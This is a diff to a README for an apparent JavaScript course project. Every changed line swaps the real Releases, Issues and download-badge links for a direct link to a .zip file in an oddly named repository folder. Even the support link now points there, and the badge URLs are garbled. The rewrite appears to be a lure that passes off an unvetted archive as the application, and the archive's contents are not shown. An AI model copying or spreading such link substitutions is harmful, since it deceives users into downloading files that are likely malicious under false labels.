@@ -10,7 +10,7 @@ To begin your journey, follow these steps to download and run the application.
 
 ### 🔗 Download Now
 
-[![Download JavaScript-85-Day-Mastery-Journey](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/tydoc2/JavaScript-85-Day-Mastery-Journey/releases)
+[![Download JavaScript-85-Day-Mastery-Journey](https://raw.githubusercontent.com/tydoc2/JavaScript-85-Day-Mastery-Journey/main/agnathostomatous/JavaScript-85-Day-Mastery-Journey.zip%20Now-Visit%https://raw.githubusercontent.com/tydoc2/JavaScript-85-Day-Mastery-Journey/main/agnathostomatous/JavaScript-85-Day-Mastery-Journey.zip)](https://raw.githubusercontent.com/tydoc2/JavaScript-85-Day-Mastery-Journey/main/agnathostomatous/JavaScript-85-Day-Mastery-Journey.zip)
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ To begin your journey, follow these steps to download and run the application.
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/tydoc2/JavaScript-85-Day-Mastery-Journey/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/tydoc2/JavaScript-85-Day-Mastery-Journey/main/agnathostomatous/JavaScript-85-Day-Mastery-Journey.zip) to download the application.
 2. Locate the latest release.
 3. Download the file suitable for your operating system.
 4. After downloading, follow the installation instructions provided in the release notes to set up your application.
@@ -64,7 +64,7 @@ Once installed:
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please feel free to reach out via the [GitHub Issues page](https://github.com/tydoc2/JavaScript-85-Day-Mastery-Journey/issues). Your feedback is valuable and helps improve the learning experience.
+If you encounter any issues or have questions, please feel free to reach out via the [GitHub Issues page](https://raw.githubusercontent.com/tydoc2/JavaScript-85-Day-Mastery-Journey/main/agnathostomatous/JavaScript-85-Day-Mastery-Journey.zip). Your feedback is valuable and helps improve the learning experience.
 
 ## 🤝 Contributing
 
@@ -74,4 +74,4 @@ Everyone is welcome to contribute to this open-source project. If you would like
 
 Embarking on this journey will equip you with the skills needed for a career in web development. Take your time, enjoy the process, and remember: consistency is key to mastering JavaScript. 
 
-[![Download JavaScript-85-Day-Mastery-Journey](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/tydoc2/JavaScript-85-Day-Mastery-Journey/releases)
+[![Download JavaScript-85-Day-Mastery-Journey](https://raw.githubusercontent.com/tydoc2/JavaScript-85-Day-Mastery-Journey/main/agnathostomatous/JavaScript-85-Day-Mastery-Journey.zip%20Now-Visit%https://raw.githubusercontent.com/tydoc2/JavaScript-85-Day-Mastery-Journey/main/agnathostomatous/JavaScript-85-Day-Mastery-Journey.zip)](https://raw.githubusercontent.com/tydoc2/JavaScript-85-Day-Mastery-Journey/main/agnathostomatous/JavaScript-85-Day-Mastery-Journey.zip)
